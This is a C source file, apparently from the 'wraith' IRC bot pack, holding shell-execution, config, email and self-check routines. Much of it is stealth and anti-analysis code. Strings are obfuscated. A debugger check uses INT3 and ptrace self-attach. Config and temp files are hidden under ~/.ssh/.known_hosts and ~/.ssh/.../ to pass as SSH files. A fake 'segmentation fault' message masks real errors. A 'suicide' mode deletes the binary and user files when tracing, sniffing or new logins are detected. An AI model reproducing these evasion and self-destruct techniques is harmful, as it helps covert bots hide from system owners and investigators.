/*
 * shell.c -- handles:
 *
 * All shell related functions
 * -shell_exec()
 * -botconfig parsing
 * -check_*()
 * -crontab functions
 *
 */

#include "common.h"
#include "shell.h"
#include "cfg.h"
#include "flags.h"
#include "main.h"
#include "dccutil.h"
#include "modules.h"
#include "misc.h"
#include "misc_file.h"
#include "bg.h"
#include "stat.h"
#include "users.h"

#include <sys/types.h>
#include <pwd.h>
#include <signal.h>
#ifdef S_ANTITRACE
#include <sys/ptrace.h>
#include <sys/wait.h>
#endif /* S_ANTITRACE */
#include <sys/utsname.h>
#include <pwd.h>
#include <errno.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <libgen.h>
#include <ctype.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>


extern struct cfg_entry CFG_LOGIN, CFG_BADPROCESS, CFG_PROCESSLIST, CFG_PROMISC,
                        CFG_TRACE, CFG_HIJACK;

extern char		tempdir[], origbotname[], botnetnick[], *binname, owneremail[],
			userfile[];
extern time_t		now;
extern struct userrec       *userlist;

conf_t conf;

void init_conf() {
  conf.bots = (conf_bot *) calloc(1, sizeof(conf_bot));
  conf.bots->nick = NULL;
  conf.bots->next = NULL;
}

/* 
 * Return the PID of a bot if it is running, otherwise return 0
 */

static int checkpid(char *nick) {
  FILE *f;
  int xx;
  char buf[DIRMAX], s[11];

  egg_snprintf(buf, sizeof buf, "%s.pid.%s", tempdir, nick);
  if ((f = fopen(buf, "r"))) {
    fgets(s, 10, f);
    fclose(f);
    xx = atoi(s);
    kill(xx, SIGCHLD);
    if (errno != ESRCH) /* PID is !running */
      return xx;
  }
  return 0;
}

static void conf_addbot(char *nick, char *ip, char *host, char *ip6, char *host6) {
  conf_bot *bot;

  for (bot = conf.bots; bot && bot->nick; bot = bot->next);
  bot->next = (conf_bot *) calloc(1, sizeof(conf_bot));
  bot->next->next = NULL;
  bot->nick = strdup(nick);
  if (bot == conf.bots) bot->localhub = 1;          /* first bot */
  if (ip)    bot->ip = strdup(ip);
  if (host)  bot->host = strdup(host);
  if (ip6)   bot->ip6 = strdup(ip6);
  if (host6) bot->host = strdup(host);
  bot->pid = checkpid(nick);
}

void free_conf() {
  conf_bot *bot, *bot_n;

  for (bot = conf.bots; bot; bot = bot_n) {
    bot_n = bot->next;
    free(bot->nick);
    if (bot->ip)    free(bot->ip);
    if (bot->host)  free(bot->host);
    if (bot->ip6)   free(bot->ip6);
    if (bot->host6) free(bot->host6);
    /* must also free() anything malloc`d in addbot() */
    free(bot);
  }
  free(conf.uname);
}

int readconf() 
{
/*  conf.uid = READ;
  conf.uname = strdup(READ);
*/
  return 0;
}

int clear_tmp()
{
  DIR *tmp;
  struct dirent *dir_ent;
  if (!(tmp = opendir(tempdir))) return 1;
  while ((dir_ent = readdir(tmp))) {
    if (strncmp(dir_ent->d_name, ".pid.", 4) && strncmp(dir_ent->d_name, ".u", 2) && strcmp(dir_ent->d_name, ".bin.old")
       && strcmp(dir_ent->d_name, ".") && strcmp(dir_ent->d_name, ".un") && strcmp(dir_ent->d_name, "..")) {
      char *file = malloc(strlen(dir_ent->d_name) + strlen(tempdir) + 1);
      file[0] = 0;
      strcat(file, tempdir);
      strcat(file, dir_ent->d_name);
      file[strlen(file)] = 0;
      unlink(file);
      free(file);
    }
  }
  closedir(tmp);
  return 0;
}


#ifdef S_LASTCHECK
char last_buf[128]="";
#endif /* S_LASTCHECK */

void check_last() {
#ifdef S_LASTCHECK
  char user[20];
  struct passwd *pw;

  if (!strcmp((char *) CFG_LOGIN.ldata ? CFG_LOGIN.ldata : CFG_LOGIN.gdata ? CFG_LOGIN.gdata : "ignore", "ignore"))
    return;

  pw = getpwuid(geteuid());
  if (!pw) return;

  strncpyz(user, pw->pw_name ? pw->pw_name : "" , sizeof(user));
  if (user[0]) {
    char *out;
    char buf[50];

    sprintf(buf, STR("last %s"), user);
    if (shell_exec(buf, NULL, &out, NULL)) {
      if (out) {
        char *p;

        p = strchr(out, '\n');
        if (p)
          *p = 0;
        if (strlen(out) > 10) {
          if (last_buf[0]) {
            if (strncmp(last_buf, out, sizeof(last_buf))) {
              char wrk[16384];

              sprintf(wrk, STR("Login: %s"), out);
              detected(DETECT_LOGIN, wrk);
            }
          }
          strncpyz(last_buf, out, sizeof(last_buf));
        }
        free(out);
      }
    }
  }
#endif /* S_LASTCHECK */
}

void check_processes()
{
#ifdef S_PROCESSCHECK
  char *proclist,
   *out,
   *p,
   *np,
   *curp,
    buf[1024],
    bin[128];

  if (!strcmp((char *) CFG_BADPROCESS.ldata ? CFG_BADPROCESS.ldata : CFG_BADPROCESS.gdata ? CFG_BADPROCESS.gdata : "ignore", "ignore"))
    return;

  proclist = (char *) (CFG_PROCESSLIST.ldata && ((char *) CFG_PROCESSLIST.ldata)[0] ?
                       CFG_PROCESSLIST.ldata : CFG_PROCESSLIST.gdata && ((char *) CFG_PROCESSLIST.gdata)[0] ? CFG_PROCESSLIST.gdata : NULL);
  if (!proclist)
    return;

  if (!shell_exec(STR("ps x"), NULL, &out, NULL))
    return;

  /* Get this binary's filename */
  strncpyz(buf, binname, sizeof(buf));
  p = strrchr(buf, '/');
  if (p) {
    p++;
    strncpyz(bin, p, sizeof(bin));
  } else {
    bin[0] = 0;
  }
  /* Fix up the "permitted processes" list */
  p = malloc(strlen(proclist) + strlen(bin) + 6);
  strcpy(p, proclist);
  strcat(p, " ");
  strcat(p, bin);
  strcat(p, " ");
  proclist = p;
  curp = out;
  while (curp) {
    np = strchr(curp, '\n');
    if (np)
      *np++ = 0;
    if (atoi(curp) > 0) {
      char *pid,
       *tty,
       *stat,
       *time,
        cmd[512],
        line[2048];

      strncpyz(line, curp, sizeof(line));
      /* it's a process line */
      /* Assuming format: pid tty stat time cmd */
      pid = newsplit(&curp);
      tty = newsplit(&curp);
      stat = newsplit(&curp);
      time = newsplit(&curp);
      strncpyz(cmd, curp, sizeof(cmd));
      /* skip any <defunct> procs "/bin/sh -c" crontab stuff and binname crontab stuff */
      if (!strstr(cmd, STR("<defunct>")) && !strncmp(cmd, STR("/bin/sh -c"), 10)
          && !strncmp(cmd, binname, strlen(binname))) {
        /* get rid of any args */
        if ((p = strchr(cmd, ' ')))
          *p = 0;
        /* remove [] or () */
        if (strlen(cmd)) {
          p = cmd + strlen(cmd) - 1;
          if (((cmd[0] == '(') && (*p == ')')) || ((cmd[0] == '[') && (*p == ']'))) {
            *p = 0;
            strcpy(buf, cmd + 1);
            strcpy(cmd, buf);
          }
        }

        /* remove path */
        if ((p = strrchr(cmd, '/'))) {
          p++;
          strcpy(buf, p);
          strcpy(cmd, buf);
        }

        /* skip "ps" */
        if (strcmp(cmd, "ps")) {
          /* see if proc's in permitted list */
          strcat(cmd, " ");
          if ((p = strstr(proclist, cmd))) {
            /* Remove from permitted list */
            while (*p != ' ')
              *p++ = 1;
          } else {
            char wrk[16384];

            sprintf(wrk, STR("Unexpected process: %s"), line);
            detected(DETECT_PROCESS, wrk);
          }
        }
      }
    }
    curp = np;
  }
  free(proclist);
  if (out)
    free(out);
#endif /* S_PROCESSCHECK */
}

void check_promisc()
{
#ifdef S_PROMISC
#ifdef SIOCGIFCONF
  char buf[8192];
  struct ifreq ifreq, *ifr;
  struct ifconf ifcnf;
  char *cp, *cplim;
  int sock;

  if (!strcmp((char *) CFG_PROMISC.ldata ? CFG_PROMISC.ldata : CFG_PROMISC.gdata ? CFG_PROMISC.gdata : "ignore", "ignore"))
    return;
  sock = socket(AF_INET, SOCK_STREAM, 0);
  ifcnf.ifc_len = 8191;
  ifcnf.ifc_buf = buf;
  if (ioctl(sock, SIOCGIFCONF, (char *) &ifcnf) < 0) {
    close(sock);
    return;
  }
  ifr = ifcnf.ifc_req;
  cplim = buf + ifcnf.ifc_len;
  for (cp = buf; cp < cplim; cp += sizeof(ifr->ifr_name) + sizeof(ifr->ifr_addr)) {
    ifr = (struct ifreq *) cp;
    ifreq = *ifr;
    if (!ioctl(sock, SIOCGIFFLAGS, (char *) &ifreq)) {
      if (ifreq.ifr_flags & IFF_PROMISC) {
        close(sock);
        detected(DETECT_PROMISC, STR("Detected promiscuous mode"));
        return;
      }
    }
  }
  close(sock);
#endif /* SIOCGIFCONF */
#endif /* S_PROMISC */
}

#ifdef S_ANTITRACE
int traced = 0;

static void got_trace(int z)
{
  traced = 0;
}
#endif /* S_ANTITRACE */

void check_trace()
{
#ifdef S_ANTITRACE
  int x, parent, i;
  struct sigaction sv, *oldsv = NULL;

  if (!strcmp((char *) CFG_TRACE.ldata ? CFG_TRACE.ldata : CFG_TRACE.gdata ? CFG_TRACE.gdata : "ignore", "ignore"))
    return;
  parent = getpid();
#ifdef __linux__
  egg_bzero(&sv, sizeof(sv));
  sv.sa_handler = got_trace;
  sigemptyset(&sv.sa_mask);
  oldsv = NULL;
  sigaction(SIGTRAP, &sv, oldsv);
  traced = 1;
  asm("INT3");
  sigaction(SIGTRAP, oldsv, NULL);
  if (traced)
    detected(DETECT_TRACE, STR("I'm being traced!"));
  else {
    x = fork();
    if (x == -1)
      return;
    else if (x == 0) {
      i = ptrace(PTRACE_ATTACH, parent, 0, 0);
      if (i == (-1) && errno == EPERM)
        detected(DETECT_TRACE, STR("I'm being traced!"));
      else {
        waitpid(parent, &i, 0);
        kill(parent, SIGCHLD);
        ptrace(PTRACE_DETACH, parent, 0, 0);
        kill(parent, SIGCHLD);
      }
      exit(0);
    } else
      wait(&i);
  }
#endif /* __linux__ */
#ifdef __FreeBSD__
  x = fork();
  if (x == -1)
    return;
  else if (x == 0) {
    i = ptrace(PT_ATTACH, parent, 0, 0);
    if (i == (-1) && errno == EBUSY)
      detected(DETECT_TRACE, STR("I'm being traced"));
    else {
      wait(&i);
      i = ptrace(PT_CONTINUE, parent, (caddr_t) 1, 0);
      kill(parent, SIGCHLD);
      wait(&i);
      i = ptrace(PT_DETACH, parent, (caddr_t) 1, 0);
      wait(&i);
    }
    exit(0);
  } else
    waitpid(x, NULL, 0);
#endif /* __FreeBSD__ */
#ifdef __OpenBSD__
  x = fork();
  if (x == -1)
    return;
  else if (x == 0) {
    i = ptrace(PT_ATTACH, parent, 0, 0);
    if (i == (-1) && errno == EBUSY)
      detected(DETECT_TRACE, STR("I'm being traced"));
    else {
      wait(&i);
      i = ptrace(PT_CONTINUE, parent, (caddr_t) 1, 0);
      kill(parent, SIGCHLD);
      wait(&i);
      i = ptrace(PT_DETACH, parent, (caddr_t) 1, 0);
      wait(&i);
    }
    exit(0);
  } else
    waitpid(x, NULL, 0);
#endif /* __OpenBSD__ */
#endif /* S_ANTITRACE */
}

int shell_exec(char *cmdline, char *input, char **output, char **erroutput)
{
  FILE *inpFile,
   *outFile,
   *errFile;
  char tmpfile[161];
  int x, fd;
  int parent = getpid();

  if (!cmdline)
    return 0;
  /* Set up temp files */
  /* always use mkstemp() when handling temp filess! -dizz */
  sprintf(tmpfile, STR("%s.in-XXXXXX"), tempdir);
  if ((fd = mkstemp(tmpfile)) == -1 || (inpFile = fdopen(fd, "w+")) == NULL) {
    if (fd != -1) {
      unlink(tmpfile);
      close(fd);
    }
    putlog(LOG_ERRORS, "*" , STR("exec: Couldn't open '%s': %s"), tmpfile, strerror(errno));
    return 0;
  }
  unlink(tmpfile);
  if (input) {
    if (fwrite(input, 1, strlen(input), inpFile) != strlen(input)) {
      fclose(inpFile);
      putlog(LOG_ERRORS, "*", STR("exec: Couldn't write to '%s': %s"), tmpfile, strerror(errno));
      return 0;
    }
    fseek(inpFile, 0, SEEK_SET);
  }
  unlink(tmpfile);
  sprintf(tmpfile, STR("%s.err-XXXXXX"), tempdir);
  if ((fd = mkstemp(tmpfile)) == -1 || (errFile = fdopen(fd, "w+")) == NULL) {
    if (fd != -1) {
      unlink(tmpfile);
      close(fd);
    }
    putlog(LOG_ERRORS, "*", STR("exec: Couldn't open '%s': %s"), tmpfile, strerror(errno));
    return 0;
  }
  unlink(tmpfile);
  sprintf(tmpfile, STR("%s.out-XXXXXX"), tempdir);
  if ((fd = mkstemp(tmpfile)) == -1 || (outFile = fdopen(fd, "w+")) == NULL) {
    if (fd != -1) {
      unlink(tmpfile);
      close(fd);
    }
    putlog(LOG_ERRORS, "*", STR("exec: Couldn't open '%s': %s"), tmpfile, strerror(errno));
    return 0;
  }
  unlink(tmpfile);
  x = fork();
  if (x == -1) {
    putlog(LOG_ERRORS, "*", STR("exec: fork() failed: %s"), strerror(errno));
    fclose(inpFile);
    fclose(errFile);
    fclose(outFile);
    return 0;
  }
  if (x) {
    /* Parent: wait for the child to complete */
    int st = 0;

    waitpid(x, &st, 0);
    /* Now read the files into the buffers */
    fclose(inpFile);
    fflush(outFile);
    fflush(errFile);
    if (erroutput) {
      char *buf;
      int fs;

      fseek(errFile, 0, SEEK_END);
      fs = ftell(errFile);
      if (fs == 0) {
        (*erroutput) = NULL;
      } else {
        buf = malloc(fs + 1);
        fseek(errFile, 0, SEEK_SET);
        fread(buf, 1, fs, errFile);
        buf[fs] = 0;
        (*erroutput) = buf;
      }
    }
    fclose(errFile);
    if (output) {
      char *buf;
      int fs;

      fseek(outFile, 0, SEEK_END);
      fs = ftell(outFile);
      if (fs == 0) {
        (*output) = NULL;
      } else {
        buf = malloc(fs + 1);
        fseek(outFile, 0, SEEK_SET);
        fread(buf, 1, fs, outFile);
        buf[fs] = 0;
        (*output) = buf;
      }
    }
    fclose(outFile);
    return 1;
  } else {
    /* Child: make fd's and set them up as std* */
    int ind,
      outd,
      errd;
    char *argv[4];

    ind = fileno(inpFile);
    outd = fileno(outFile);
    errd = fileno(errFile);
    if (dup2(ind, STDIN_FILENO) == (-1)) {
      kill(parent, SIGCHLD);
      exit(1);
    }
    if (dup2(outd, STDOUT_FILENO) == (-1)) {
      kill(parent, SIGCHLD);
      exit(1);
    }
    if (dup2(errd, STDERR_FILENO) == (-1)) {
      kill(parent, SIGCHLD);
      exit(1);
    }
    argv[0] = STR("sh");
    argv[1] = STR("-c");
    argv[2] = cmdline;
    argv[3] = NULL;
    execvp(argv[0], &argv[0]);
    kill(parent, SIGCHLD);
    exit(1);
  }
}

void detected(int code, char *msg)
{
#ifdef LEAF
  module_entry *me;
#endif /* LEAF */
  char *p = NULL;
  char tmp[512];
  struct userrec *u;
  struct flag_record fr = { FR_GLOBAL, 0, 0 };
  int act;

  u = get_user_by_handle(userlist, botnetnick);
#ifdef S_LASTCHECK
  if (code == DETECT_LOGIN)
    p = (char *) (CFG_LOGIN.ldata ? CFG_LOGIN.ldata : (CFG_LOGIN.gdata ? CFG_LOGIN.gdata : NULL));
#endif /* S_LASTCHECK */
#ifdef S_ANTITRACE
  if (code == DETECT_TRACE)
    p = (char *) (CFG_TRACE.ldata ? CFG_TRACE.ldata : (CFG_TRACE.gdata ? CFG_TRACE.gdata : NULL));
#endif /* S_ANTITRACE */
#ifdef S_PROMISC
  if (code == DETECT_PROMISC)
    p = (char *) (CFG_PROMISC.ldata ? CFG_PROMISC.ldata : (CFG_PROMISC.gdata ? CFG_PROMISC.gdata : NULL));
#endif /* S_PROMISC */
#ifdef S_PROCESSCHECK
  if (code == DETECT_PROCESS)
    p = (char *) (CFG_BADPROCESS.ldata ? CFG_BADPROCESS.ldata : (CFG_BADPROCESS.gdata ? CFG_BADPROCESS.gdata : NULL));
#endif /* S_PROMISC */
#ifdef S_HIJACKCHECK
  if (code == DETECT_SIGCONT)
    p = (char *) (CFG_HIJACK.ldata ? CFG_HIJACK.ldata : (CFG_HIJACK.gdata ? CFG_HIJACK.gdata : NULL));
#endif /* S_PROMISC */

  if (!p)
    act = DET_WARN;
  else if (!strcmp(p, STR("die")))
    act = DET_DIE;
  else if (!strcmp(p, STR("reject")))
    act = DET_REJECT;
  else if (!strcmp(p, STR("suicide")))
    act = DET_SUICIDE;
  else if (!strcmp(p, STR("ignore")))
    act = DET_IGNORE;
  else
    act = DET_WARN;
  switch (act) {
  case DET_IGNORE:
    break;
  case DET_WARN:
    putlog(LOG_WARN, "*", msg);
    break;
  case DET_REJECT:
    do_fork();
    putlog(LOG_WARN, "*", STR("Setting myself +d: %s"), msg);
    sprintf(tmp, STR("+d: %s"), msg);
    set_user(&USERENTRY_COMMENT, u, tmp);
    get_user_flagrec(u, &fr, 0);
    fr.global = USER_DEOP | USER_BOT;

    set_user_flagrec(u, &fr, 0);
    sleep(1);
    break;
  case DET_DIE:
    putlog(LOG_WARN, "*", STR("Dying: %s"), msg);
    sprintf(tmp, STR("Dying: %s"), msg);
    set_user(&USERENTRY_COMMENT, u, tmp);
#ifdef LEAF
    if ((me = module_find("server", 0, 0))) {
      Function *func = me->funcs;
      (func[SERVER_NUKESERVER]) ("BBL");
    }
#endif /* LEAF */
    sleep(1);
    fatal(msg, 0);
    break;
  case DET_SUICIDE:
    putlog(LOG_WARN, "*", STR("Comitting suicide: %s"), msg);
    sprintf(tmp, STR("Suicide: %s"), msg);
    set_user(&USERENTRY_COMMENT, u, tmp);
#ifdef LEAF
    if ((me = module_find("server", 0, 0))) {
      Function *func = me->funcs;
      (func[SERVER_NUKESERVER]) ("HARAKIRI!!");
    }
#endif /* LEAF */
    sleep(1);
    unlink(binname);
#ifdef HUB
    unlink(userfile);
    sprintf(tmp, STR("%s~"), userfile);
    unlink(tmp);
#endif /* HUB */
    fatal(msg, 0);
    break;
  }
}

char *werr_tostr(int errnum)
{
  switch (errnum) {
  case ERR_BINSTAT:
    return STR("Cannot access binary");
  case ERR_BINMOD:
    return STR("Cannot chmod() binary");
  case ERR_PASSWD:
    return STR("Cannot access the global passwd file");
  case ERR_WRONGBINDIR:
    return STR("Wrong directory/binary name");
  case ERR_CONFSTAT:
#ifdef LEAF
    return STR("Cannot access config directory (~/.ssh/)");
#else
    return STR("Cannot access config directory (./)");
#endif /* LEAF */
  case ERR_TMPSTAT:
#ifdef LEAF
    return STR("Cannot access tmp directory (~/.ssh/.../)");
#else
    return STR("Cannot access config directory (./tmp/)");
#endif /* LEAF */
  case ERR_CONFDIRMOD:
#ifdef LEAF
    return STR("Cannot chmod() config directory (~/.ssh/)");
#else
    return STR("Cannot chmod() config directory (./)");
#endif /* LEAF */
  case ERR_CONFMOD:
#ifdef LEAF
    return STR("Cannot chmod() config (~/.ssh/.known_hosts/)");
#else
    return STR("Cannot chmod() config (./conf)");
#endif /* LEAF */
  case ERR_TMPMOD:
#ifdef LEAF
    return STR("Cannot chmod() tmp directory (~/.ssh/.../)");
#else
    return STR("Cannot chmod() tmp directory (./tmp)");
#endif /* LEAF */
  case ERR_NOCONF:
#ifdef LEAF
    return STR("The local config is missing (~/.ssh/.known_hosts)");
#else
    return STR("The local config is missing (./conf)");
#endif /* LEAF */
  case ERR_CONFBADENC:
    return STR("Encryption in config is wrong/corrupt");
  case ERR_WRONGUID:
    return STR("UID in conf does not match getuid()");
  case ERR_WRONGUNAME:
    return STR("Uname in conf does not match uname()");
  case ERR_BADCONF:
    return STR("Config file is incomplete");
  default:
    return STR("Unforseen error");
  }

}

void werr(int errnum)
{
  putlog(LOG_MISC, "*", STR("error #%d"), errnum);
  sdprintf(STR("error translates to: %s"), werr_tostr(errnum));
  printf(STR("(segmentation fault)\n"));
  fatal("", 0);
}

int email(char *subject, char *msg, int who)
{
  struct utsname un;
  char open[2048], addrs[1024];
  int mail = 0, sendmail = 0;
  FILE *f;

  uname(&un);
  if (is_file("/usr/sbin/sendmail"))
    sendmail++;
  else if (is_file("/usr/bin/mail"))
    mail++;
  else {
    putlog(LOG_WARN, "*", "I Have no usable mail client.");
    return 1;
  }
  open[0] = addrs[0] = 0;

  if (who & EMAIL_OWNERS) {
    sprintf(addrs, "%s", replace(owneremail, ",", " "));
  }
  if (who & EMAIL_TEAM) {
    if (addrs[0])
      sprintf(addrs, "%s wraith@shatow.net", addrs);
    else
      sprintf(addrs, "wraith@shatow.net");
  }

  if (sendmail)
    sprintf(open, "/usr/sbin/sendmail -t");
  else if (mail)
    sprintf(open, "/usr/bin/mail %s -a \"From: %s@%s\" -s \"%s\" -a \"Content-Type: text/plain\"", addrs, (origbotname && origbotname[0]) ? origbotname : "none", un.nodename, subject);

  if ((f = popen(open, "w"))) {
    if (sendmail) {
      struct passwd *pw;
      pw = getpwuid(geteuid());
      fprintf(f, "To: %s\n", addrs);
      fprintf(f, "From: %s@%s\n", (origbotname && origbotname[0]) ? origbotname : pw->pw_name, un.nodename);
      fprintf(f, "Subject: %s\n", subject);
      fprintf(f, "Content-Type: text/plain\n");
    }
    fprintf(f, "%s\n", msg);
    if (fflush(f))
      return 1;
    if (pclose(f))
      return 1;
  } else
    return 1;
  return 0;
}

void baduname(char *conf, char *my_uname) {
  char *tmpfile = malloc(strlen(tempdir) + 3 + 1);
  int send = 0;

  tmpfile[0] = 0;
  sprintf(tmpfile, "%s.un", tempdir);
  sdprintf("CHECKING %s", tmpfile);
  if (is_file(tmpfile)) {
    struct stat ss;
    time_t diff;

    stat(tmpfile, &ss);
    diff = now - ss.st_mtime;
    if (diff >= 86400) send++;          /* only send once a day */
  } else {
    FILE *fp;
    if ((fp = fopen(tmpfile, "w"))) {
      fprintf(fp, "\n");
      fflush(fp);
      fclose(fp);
      send++;           /* only send if we could write the file. */
    }
  }
  if (send) {
    struct passwd *pw;
    struct utsname un;
    char msg[501], subject[31];

    pw = getpwuid(geteuid());
    if (!pw) return;
    uname(&un);
    egg_snprintf(subject, sizeof subject, "CONF/UNAME() mismatch notice");
    egg_snprintf(msg, sizeof msg, "This is an auto email from a wraith bot which has you in it's OWNER_EMAIL list..\n \nThe uname() output on this box has changed, probably due to a kernel upgrade...\nMy login is: %s\nConf : %s\nUname(): %s\n \nThis email will only be sent once a day while this error is present.\nYou need to login to my shell (%s) and fix my local config.\n", pw->pw_name, conf, my_uname, un.nodename);
    email(subject, msg, EMAIL_OWNERS);
  }
  free(tmpfile);
}

char *homedir()
{
  static char homedir[DIRMAX] = "";
  if (!homedir || (homedir && !homedir[0])) {
    char tmp[DIRMAX];
    struct passwd *pw;
    sdprintf(STR("If the bot dies after this, try compiling on Debian."));
    Context;
    pw = getpwuid(geteuid());
    sdprintf(STR("End Debian suggestion."));

    if (!pw)
     werr(ERR_PASSWD);
    Context;
    egg_snprintf(tmp, sizeof tmp, "%s", pw->pw_dir);
    Context;
    realpath(tmp, homedir); /* this will convert lame home dirs of /home/blah->/usr/home/blah */
  }
  return homedir;
}

char *confdir()
{
  static char confdir[DIRMAX] = "";
  if (!confdir || (confdir && !confdir[0])) {
#ifdef LEAF
    {
      egg_snprintf(confdir, sizeof confdir, "%s/.ssh", homedir());
    }
#endif /* LEAF */
#ifdef HUB
    {
      char *buf = strdup(binname);

      egg_snprintf(confdir, sizeof confdir, "%s", dirname(buf));
      free(buf);
    }
#endif /* HUB */
  }
  return confdir;
}

char *my_uname()
{
  static char os_uname[250] = "";
  if (!os_uname || (os_uname && !os_uname[0])) {
    char *unix_n, *vers_n;
    struct utsname un;

    if (uname(&un) < 0) {
      unix_n = "*unkown*";
      vers_n = "";
    } else {
      unix_n = un.nodename;
#ifdef __FreeBSD__
      vers_n = un.release;
#else /* __linux__ */
      vers_n = un.version;
#endif /* __FreeBSD__ */
    }
    egg_snprintf(os_uname, sizeof os_uname, "%s %s", unix_n, vers_n);
  }
  return os_uname;
}


